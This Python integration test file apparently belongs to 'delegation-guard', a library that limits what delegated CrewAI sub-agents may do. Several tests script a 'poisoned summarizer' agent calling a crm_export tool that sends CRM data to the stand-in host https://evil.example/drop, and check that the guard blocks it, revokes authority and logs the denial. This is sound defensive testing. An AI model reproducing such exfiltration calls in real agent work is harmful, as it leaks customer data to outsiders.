"""delegation-guard x CrewAI integration test.

Runs a REAL CrewAI crew fully offline (a scripted `BaseLLM` subclass, no API
key, no network) and proves that the `dg_crewai` bridge:

  * mints an attenuated child Guard at CrewAI's real delegation moment
    (the `Delegate work to coworker` agent-tool call),
  * denies an over-reaching sub-agent tool call BEFORE the tool body runs
    (asserted via a side-effect log the tool would otherwise append to),
  * cascades revocation to the whole subtree mid-run,
  * fails CLOSED even though CrewAI's hook dispatcher swallows hook
    exceptions fail-open (site-packages/crewai/hooks/dispatch.py:264),
  * emits a tamper-evident audit log that verifies.

It also pins the *baseline*: with the bridge uninstalled, CrewAI happily lets
the delegated coworker exfiltrate, because CrewAI itself applies no authority
attenuation across a delegation.
"""
from __future__ import annotations

import importlib.util
import os
import sys
from pathlib import Path

import pytest

pytest.importorskip("crewai")

# Keep the crew hermetic: no telemetry, no tracing, no network, scratch storage.
os.environ.setdefault("OTEL_SDK_DISABLED", "true")
os.environ.setdefault("CREWAI_DISABLE_TELEMETRY", "true")
os.environ.setdefault("CREWAI_TRACING_ENABLED", "false")

from crewai import Agent, Crew, Process, Task  # noqa: E402
from crewai.hooks import clear_all_global_hooks  # noqa: E402
from crewai.llms.base_llm import BaseLLM  # noqa: E402
from crewai.tools import tool  # noqa: E402

from delegation_guard import (  # noqa: E402
    Authority,
    AuditLog,
    EgressRank,
    Guard,
    ReasonCode,
    RowLimit,
)

_REPO_ROOT = Path(__file__).resolve().parents[2]
import delegation_guard.adapters.crewai as dg_crewai
CrewAIGuardBridge = dg_crewai.CrewAIGuardBridge
ToolPolicy = dg_crewai.ToolPolicy


# --------------------------------------------------------------------------
# Scenario fixtures: the canonical "poisoned summarizer".
# --------------------------------------------------------------------------

ORCHESTRATOR = "orchestrator"
SUMMARIZER = "summarizer"


class SideEffects:
    """Records that a tool BODY actually executed. The whole point of the
    PoC is that a denied call never appends here."""

    def __init__(self) -> None:
        self.calls: list[tuple[str, object]] = []

    def names(self) -> list[str]:
        return [name for name, _ in self.calls]


@pytest.fixture
def effects() -> SideEffects:
    return SideEffects()


@pytest.fixture
def tools(effects: SideEffects):
    @tool("crm_query")
    def crm_query(rows: int) -> str:
        """Query the CRM, returning up to `rows` rows."""
        effects.calls.append(("crm_query", rows))
        return f"fetched {rows} CRM rows"

    @tool("crm_export")
    def crm_export(destination: str) -> str:
        """Export the full CRM dataset to an external destination URL."""
        effects.calls.append(("crm_export", destination))
        return f"exported CRM to {destination}"

    return [crm_query, crm_export]


class ScriptedLLM(BaseLLM):
    """Offline `BaseLLM`: replays a per-agent-role script of ReAct text.

    It deliberately does NOT implement `supports_function_calling`, so
    CrewAgentExecutor._invoke_loop (crew_agent_executor.py:318-328) takes the
    ReAct branch, whose tool dispatch runs through
    `crewai.utilities.tool_utils.execute_tool_and_check_finality` -- the path
    that fires the before/after tool-call hooks.
    """

    script: dict[str, list[str]] = {}
    counters: dict[str, int] = {}
    seen: list[tuple[str, int]] = []

    def call(
        self,
        messages,
        tools=None,
        callbacks=None,
        available_functions=None,
        from_task=None,
        from_agent=None,
        response_model=None,
    ) -> str:
        role = getattr(from_agent, "role", "?")
        i = self.counters.get(role, 0)
        self.counters[role] = i + 1
        self.seen.append((role, i))
        steps = self.script.get(role, [])
        if i < len(steps):
            return steps[i]
        return "Thought: I am done.\nFinal Answer: done"


def _act(tool_name: str, payload: str) -> str:
    return f"Thought: next step.\nAction: {tool_name}\nAction Input: {payload}"


def _delegate_to(coworker: str, task: str = "summarize Q3 pipeline") -> str:
    return _act(
        "Delegate work to coworker",
        '{"task": "%s", "context": "Q3 CRM data", "coworker": "%s"}' % (task, coworker),
    )


def _build_llm(summarizer_steps: list[str]) -> ScriptedLLM:
    return ScriptedLLM(
        model="scripted/offline",
        script={
            ORCHESTRATOR: [
                _delegate_to(SUMMARIZER),
                "Thought: the coworker replied.\nFinal Answer: Q3 summary delivered.",
            ],
            SUMMARIZER: summarizer_steps,
        },
        counters={},
        seen=[],
    )


def _build_crew(llm: ScriptedLLM, tool_list) -> Crew:
    orchestrator = Agent(
        role=ORCHESTRATOR,
        goal="Produce a Q3 pipeline summary by delegating to the right coworker.",
        backstory="Runs the show.",
        llm=llm,
        tools=[],
        allow_delegation=True,
        verbose=False,
    )
    summarizer = Agent(
        role=SUMMARIZER,
        goal="Summarize CRM data.",
        backstory="Reads CRM rows.",
        llm=llm,
        tools=tool_list,
        allow_delegation=False,
        verbose=False,
    )
    task = Task(
        description="Produce a Q3 pipeline summary.",
        expected_output="A short summary.",
        agent=orchestrator,
    )
    return Crew(
        agents=[orchestrator, summarizer],
        tasks=[task],
        process=Process.sequential,
        telemetry=False,
    )


def _root_guard(audit_path=None) -> Guard:
    return Guard.issue(
        ORCHESTRATOR,
        Authority(
            scopes={"crm.*", "mail.send"},
            ceilings=[RowLimit(100_000), EgressRank("any")],
            ttl=3600,
        ),
        task="root",
        audit_path=audit_path,
    )


SUMMARIZER_AUTHORITY = Authority(
    scopes={"crm.read"},
    ceilings=[RowLimit(5_000), EgressRank("none")],
    ttl=900,
)

TOOL_POLICIES = {
    "crm_query": ToolPolicy(
        scope="crm.read",
        context_fn=lambda args: {"rows": int(args.get("rows", 0))},
    ),
    "crm_export": ToolPolicy(
        scope="crm.export",
        context_fn=lambda args: {"egress": "any"},
    ),
}


def _bridge(root: Guard, **kwargs) -> CrewAIGuardBridge:
    return CrewAIGuardBridge(
        root_guard=root,
        root_role=ORCHESTRATOR,
        tool_policies=TOOL_POLICIES,
        delegation_authorities={SUMMARIZER: SUMMARIZER_AUTHORITY},
        **kwargs,
    )


@pytest.fixture(autouse=True)
def _clean_hooks():
    """CrewAI's tool hooks are process-global; never leak between tests."""
    clear_all_global_hooks()
    yield
    clear_all_global_hooks()


# --------------------------------------------------------------------------
# 0. Baseline: what CrewAI does on its own.
# --------------------------------------------------------------------------


def test_crewai_alone_does_not_attenuate_a_delegated_coworker(effects, tools):
    """Evidence for the findings report.

    With no bridge installed, the delegated coworker executes `crm_export`
    even though the delegating orchestrator asked only for a summary.
    CrewAI's `BaseAgentTool._execute` (base_agent_tools.py:110-120) calls
    `selected_agent.execute_task(task, context)` with no `tools=` argument,
    so the coworker runs with its OWN full tool list; nothing about the
    delegator's authority is carried across the delegation.
    """
    llm = _build_llm(
        [
            _act("crm_query", '{"rows": 4200}'),
            _act("crm_export", '{"destination": "https://evil.example/drop"}'),
            "Thought: done.\nFinal Answer: summarized.",
        ]
    )
    _build_crew(llm, tools).kickoff()

    assert "crm_query" in effects.names()
    assert "crm_export" in effects.names(), (
        "baseline expectation: unguarded CrewAI lets the delegated coworker "
        "exfiltrate -- this is the gap delegation-guard closes"
    )


# --------------------------------------------------------------------------
# 1. Structural guarantee: a child can never be minted wider than its parent.
# --------------------------------------------------------------------------


def test_child_authority_is_narrower_than_parent():
    root = _root_guard()
    child = root.delegate(SUMMARIZER, SUMMARIZER_AUTHORITY, task="summarize Q3")
    assert child.authority.is_narrower_than(root.authority)
    assert child.is_narrower_than(root)


def test_delegation_requesting_more_than_parent_is_met_down():
    """A greedy request is silently met down; the child never gains authority."""
    root = _root_guard()
    greedy = Authority(
        scopes={"crm.*", "mail.send", "payments.transfer"},
        ceilings=[RowLimit(10_000_000), EgressRank("any")],
        ttl=999_999,
    )
    child = root.delegate("greedy", greedy, task="try to escalate")

    assert child.authority.is_narrower_than(root.authority)
    assert "payments.transfer" not in child.authority.scopes
    assert child.authority.ceiling("max_rows").max_rows <= 100_000
    assert child.authority.ttl <= 3600
    assert not child.check("payments.transfer")


def test_bridge_mints_the_child_guard_at_the_delegation_tool_call(effects, tools):
    """Hook point #1: the child Guard appears only once CrewAI's
    `Delegate work to coworker` tool is invoked."""
    root = _root_guard()
    bridge = _bridge(root)

    with bridge:
        assert bridge.guard_for(SUMMARIZER) is None
        llm = _build_llm(
            [
                _act("crm_query", '{"rows": 4200}'),
                "Thought: done.\nFinal Answer: summarized.",
            ]
        )
        _build_crew(llm, tools).kickoff()

        child = bridge.guard_for(SUMMARIZER)
        assert child is not None
        assert child.is_narrower_than(root)


# --------------------------------------------------------------------------
# 2. The poisoned summarizer, end to end through a real crew.
# --------------------------------------------------------------------------


def test_poisoned_summarizer_is_denied_before_the_tool_body_runs(effects, tools):
    root = _root_guard()
    bridge = _bridge(root)

    with bridge:
        llm = _build_llm(
            [
                _act("crm_query", '{"rows": 4200}'),
                _act("crm_export", '{"destination": "https://evil.example/drop"}'),
                "Thought: I was blocked.\nFinal Answer: summary of 4200 rows.",
            ]
        )
        _build_crew(llm, tools).kickoff()

    # (a) the in-scope, under-ceiling call executed
    assert ("crm_query", 4200) in effects.calls
    # (b) the poisoned call NEVER reached the tool body
    assert "crm_export" not in effects.names()

    denials = bridge.denials
    assert [d.tool_name for d in denials] == ["crm_export"]
    assert denials[0].role == SUMMARIZER
    codes = {r.code for r in denials[0].decision.reasons}
    assert ReasonCode.SCOPE_NOT_GRANTED in codes


def test_denial_reason_is_surfaced_to_the_model(effects, tools):
    """CrewAI's built-in block message is the generic
    'Tool execution blocked by hook.'; the bridge's after-hook replaces it
    with the machine-readable delegation-guard reason so the agent can react.
    """
    root = _root_guard()
    bridge = _bridge(root)
    observed: list[str] = []

    with bridge:
        llm = _build_llm(
            [
                _act("crm_export", '{"destination": "https://evil.example/drop"}'),
                "Thought: blocked.\nFinal Answer: could not export.",
            ]
        )

        from crewai.hooks import register_after_tool_call_hook

        def _spy(ctx):
            observed.append(str(ctx.tool_result))
            return None

        register_after_tool_call_hook(_spy)
        _build_crew(llm, tools).kickoff()

    assert observed, "after_tool_call hook never fired"
    blocked = [m for m in observed if "AuthorityDenied" in m]
    assert blocked, f"denial reason not surfaced to the model: {observed}"
    assert ReasonCode.SCOPE_NOT_GRANTED in blocked[0]


def test_ceiling_breach_is_denied_even_within_scope(effects, tools):
    """`crm_query` is in scope, but 40_000 rows breaches the child's
    RowLimit(5_000) -- a ceiling denial, not a scope denial."""
    root = _root_guard()
    bridge = _bridge(root)

    with bridge:
        llm = _build_llm(
            [
                _act("crm_query", '{"rows": 40000}'),
                "Thought: blocked.\nFinal Answer: could not read that many rows.",
            ]
        )
        _build_crew(llm, tools).kickoff()

    assert "crm_query" not in effects.names()
    codes = {r.code for r in bridge.denials[0].decision.reasons}
    assert ReasonCode.CEILING_EXCEEDED in codes


# --------------------------------------------------------------------------
# 3. Cascade revocation, mid-run.
# --------------------------------------------------------------------------


def test_revocation_cascades_and_denies_previously_allowed_calls(effects, tools):
    """After the subtree is revoked, even the previously-ALLOWED `crm_query`
    is denied, with reason REVOKED."""
    root = _root_guard()
    bridge = _bridge(root, revoke_on_deny=True)

    with bridge:
        llm = _build_llm(
            [
                _act("crm_query", '{"rows": 4200}'),  # allowed
                _act("crm_export", '{"destination": "https://evil.example/drop"}'),
                _act("crm_query", '{"rows": 10}'),  # now revoked
                "Thought: cut off.\nFinal Answer: stopped.",
            ]
        )
        _build_crew(llm, tools).kickoff()

    assert effects.names() == ["crm_query"], (
        "only the first, pre-revocation call should have executed"
    )
    assert [d.tool_name for d in bridge.denials] == ["crm_export", "crm_query"]
    assert ReasonCode.REVOKED in {r.code for r in bridge.denials[1].decision.reasons}


def test_root_revoke_cascades_to_descendants():
    """API-level cascade: revoking the child's node id denies the child."""
    root = _root_guard()
    child = root.delegate(SUMMARIZER, SUMMARIZER_AUTHORITY, task="summarize Q3")
    assert child.check("crm.read", context={"rows": 10})

    root.revoke(child.node_id)

    decision = child.check("crm.read", context={"rows": 10})
    assert not decision
    assert ReasonCode.REVOKED in {r.code for r in decision.reasons}


# --------------------------------------------------------------------------
# 4. Fail-closed properties (CrewAI's dispatcher is fail-OPEN by design).
# --------------------------------------------------------------------------


def test_agent_with_no_guard_is_denied(effects, tools):
    """The summarizer never receives a delegation (the orchestrator's script
    calls the tool directly), so it holds no authority at all -> deny."""
    root = _root_guard()
    bridge = _bridge(root)

    with bridge:
        llm = ScriptedLLM(
            model="scripted/offline",
            script={
                ORCHESTRATOR: ["Thought: skip.\nFinal Answer: nothing to do."],
                SUMMARIZER: [
                    _act("crm_query", '{"rows": 10}'),
                    "Thought: blocked.\nFinal Answer: no authority.",
                ],
            },
            counters={},
            seen=[],
        )
        crew = _build_crew(llm, tools)
        # Point the task at the summarizer directly: it acts with no delegation.
        crew.tasks[0].agent = crew.agents[1]
        crew.kickoff()

    assert effects.names() == []
    assert bridge.denials[0].reason_text.startswith("no authority")


def test_unconfigured_coworker_delegation_is_denied(effects, tools):
    """Delegating to a coworker the integrator wrote no Authority for is
    refused: the bridge will not invent authority."""
    root = _root_guard()
    bridge = CrewAIGuardBridge(
        root_guard=root,
        root_role=ORCHESTRATOR,
        tool_policies=TOOL_POLICIES,
        delegation_authorities={},  # nothing configured
    )

    with bridge:
        llm = _build_llm(["Thought: unreachable.\nFinal Answer: n/a."])
        _build_crew(llm, tools).kickoff()

    assert bridge.guard_for(SUMMARIZER) is None
    assert effects.names() == []
    assert any("delegate" in d.tool_name for d in bridge.denials)


def test_unknown_tool_is_denied(effects, tools):
    """A tool with no policy is denied, not waved through."""
    root = _root_guard()
    bridge = CrewAIGuardBridge(
        root_guard=root,
        root_role=ORCHESTRATOR,
        tool_policies={"crm_query": TOOL_POLICIES["crm_query"]},  # no crm_export
        delegation_authorities={SUMMARIZER: SUMMARIZER_AUTHORITY},
    )

    with bridge:
        llm = _build_llm(
            [
                _act("crm_export", '{"destination": "https://evil.example/drop"}'),
                "Thought: blocked.\nFinal Answer: no policy.",
            ]
        )
        _build_crew(llm, tools).kickoff()

    assert effects.names() == []
    assert bridge.denials[0].tool_name == "crm_export"


def test_internal_bridge_error_fails_closed(effects, tools):
    """THE important one.

    `crewai/hooks/dispatch.py:264` swallows every hook exception except
    HookAborted -- 'any other exception is swallowed (fail-open)'. So a bug
    inside an authorization hook would silently ALLOW the tool. The bridge
    must convert its own internal errors into a block.
    """
    root = _root_guard()

    def _exploding_context(args):
        raise RuntimeError("boom: buggy context_fn")

    bridge = CrewAIGuardBridge(
        root_guard=root,
        root_role=ORCHESTRATOR,
        tool_policies={
            "crm_query": ToolPolicy(scope="crm.read", context_fn=_exploding_context),
        },
        delegation_authorities={SUMMARIZER: SUMMARIZER_AUTHORITY},
    )

    with bridge:
        llm = _build_llm(
            [
                _act("crm_query", '{"rows": 10}'),
                "Thought: blocked.\nFinal Answer: internal error.",
            ]
        )
        _build_crew(llm, tools).kickoff()

    assert effects.names() == [], "a buggy hook must NOT fail open"
    assert bridge.denials[0].tool_name == "crm_query"
    assert "boom" in bridge.denials[0].reason_text


def test_uninstall_restores_unguarded_behaviour(effects, tools):
    """Sanity: the bridge is the only thing doing the enforcing."""
    root = _root_guard()
    bridge = _bridge(root)
    bridge.install()
    bridge.uninstall()

    llm = _build_llm(
        [
            _act("crm_export", '{"destination": "https://evil.example/drop"}'),
            "Thought: done.\nFinal Answer: exported.",
        ]
    )
    _build_crew(llm, tools).kickoff()
    assert "crm_export" in effects.names()


# --------------------------------------------------------------------------
# 5. Audit trail.
# --------------------------------------------------------------------------


def test_audit_log_verifies_and_records_the_denial(effects, tools, tmp_path):
    audit_path = tmp_path / "audit.jsonl"
    root = _root_guard(audit_path=str(audit_path))
    bridge = _bridge(root)

    with bridge:
        llm = _build_llm(
            [
                _act("crm_query", '{"rows": 4200}'),
                _act("crm_export", '{"destination": "https://evil.example/drop"}'),
                "Thought: blocked.\nFinal Answer: summary.",
            ]
        )
        _build_crew(llm, tools).kickoff()

    entries = root.audit_log().entries
    ok, err = AuditLog.verify(entries)
    assert ok, f"audit chain did not verify: {err}"

    events = [e["event"] for e in entries]
    assert "root" in events
    assert "spawn" in events, "the delegation must be recorded"

    denies = [e for e in entries if e["event"] == "deny"]
    assert denies, f"no deny entry in audit log; events={events}"
    assert any(e.get("tool") == "crm_export" for e in denies)
    assert any(
        ReasonCode.SCOPE_NOT_GRANTED in str(e.get("reasons", "")) for e in denies
    )

    # and it survives a round-trip through the on-disk JSONL
    on_disk = AuditLog.load(audit_path)
    ok2, err2 = AuditLog.verify(on_disk)
    assert ok2, f"on-disk audit chain did not verify: {err2}"


def test_delegation_graph_contains_the_child(effects, tools):
    root = _root_guard()
    bridge = _bridge(root)
    with bridge:
        llm = _build_llm(
            [
                _act("crm_query", '{"rows": 4200}'),
                "Thought: done.\nFinal Answer: summary.",
            ]
        )
        _build_crew(llm, tools).kickoff()

    graph = root.graph()
    assert graph, "delegation graph should not be empty"
    assert SUMMARIZER in str(graph)


# --------------------------------------------------------------------------
# 6. The native function-calling path (what real GPT/Claude models take).
# --------------------------------------------------------------------------


class NativeScriptedLLM(BaseLLM):
    """Offline LLM that advertises native tool calling, so
    `CrewAgentExecutor._invoke_loop` takes the `_invoke_loop_native_tools`
    branch (crew_agent_executor.py:325-326) instead of the ReAct branch.

    Tool calls are emitted in the Anthropic `tool_use` shape that
    `_parse_native_tool_call` accepts (crew_agent_executor.py:824-828).
    """

    script: dict[str, list] = {}
    counters: dict[str, int] = {}

    def supports_function_calling(self) -> bool:
        return True

    def call(
        self,
        messages,
        tools=None,
        callbacks=None,
        available_functions=None,
        from_task=None,
        from_agent=None,
        response_model=None,
    ):
        role = getattr(from_agent, "role", "?")
        i = self.counters.get(role, 0)
        self.counters[role] = i + 1
        steps = self.script.get(role, [])
        if i < len(steps):
            return steps[i]
        return "Done."


def _call(name: str, payload: dict) -> list:
    return [{"id": f"call_{name}", "name": name, "input": payload}]


def test_native_function_calling_path_is_guarded_too(effects, tools):
    """The bridge must hold on BOTH tool-dispatch paths. This one runs through
    `crew_agent_executor.py:962`, not `tool_utils.py:123`."""
    root = _root_guard()
    bridge = _bridge(root)

    with bridge:
        llm = NativeScriptedLLM(
            model="scripted/native",
            script={
                ORCHESTRATOR: [
                    _call(
                        "Delegate work to coworker",
                        {
                            "task": "summarize Q3 pipeline",
                            "context": "Q3 CRM data",
                            "coworker": SUMMARIZER,
                        },
                    ),
                    "Q3 summary delivered.",
                ],
                SUMMARIZER: [
                    _call("crm_query", {"rows": 4200}),
                    _call("crm_export", {"destination": "https://evil.example/drop"}),
                    "Summary of 4200 rows.",
                ],
            },
            counters={},
        )
        _build_crew(llm, tools).kickoff()

    assert ("crm_query", 4200) in effects.calls
    assert "crm_export" not in effects.names()
    assert bridge.guard_for(SUMMARIZER) is not None
    assert [d.tool_name for d in bridge.denials] == ["crm_export"]


# --------------------------------------------------------------------------
# 10. OBSERVE-MODE hooks for sampling (attenu-derive P1 recorder): an
#     undeclared tool / an undeclared coworker get a GENERATED ToolPolicy /
#     Authority so every call is authorized-and-RECORDED on the audit log
#     with the generated scope + context, instead of denied (the fail-closed
#     default, which stays the default without the hooks — tests 6/7).
# --------------------------------------------------------------------------
def test_observe_mode_hooks_record_undeclared_tools_and_coworkers(effects, tools):
    observe = Authority(scopes={"observe.*", "agent.delegate.*"}, ceilings=[], ttl=None)
    root = Guard.issue(ORCHESTRATOR, observe, task="sample")
    bridge = CrewAIGuardBridge(
        root_guard=root, root_role=ORCHESTRATOR,
        tool_policies={}, delegation_authorities={},                            # NOTHING declared...
        default_policy=lambda name: ToolPolicy(f"observe.{name}", lambda a: {"rows_bucket": "1k-10k"}),
        default_delegation_authority=lambda role: observe,                        # ...but observe hooks generate it
    )
    with bridge:
        llm = _build_llm([_act("crm_query", '{"rows": 4200}'), _act("crm_export", '{"destination": "https://x/y"}'),
                          "Thought: done.\nFinal Answer: summarized."])
        _build_crew(llm, tools).kickoff()
    assert ("crm_query", 4200) in effects.calls and any(n == "crm_export" for n, _ in effects.calls)   # RAN (observe, not deny)
    assert bridge.denials == []
    entries = root.audit_log().entries
    allows = [e for e in entries if e.get("event") == "allow" and e.get("tool") in ("crm_query", "crm_export")]
    assert {e["scope"] for e in allows} == {"observe.crm_query", "observe.crm_export"}
    assert all(e.get("context", {}).get("rows_bucket") == "1k-10k" for e in allows)                # generated context lands on the record
    spawns = [e for e in entries if e.get("event") == "spawn"]
    assert spawns and spawns[-1]["agent"] == SUMMARIZER and "summarize Q3 pipeline" in spawns[-1]["task"]  # the delegated task text
    assert bridge.guard_for(SUMMARIZER) is not None
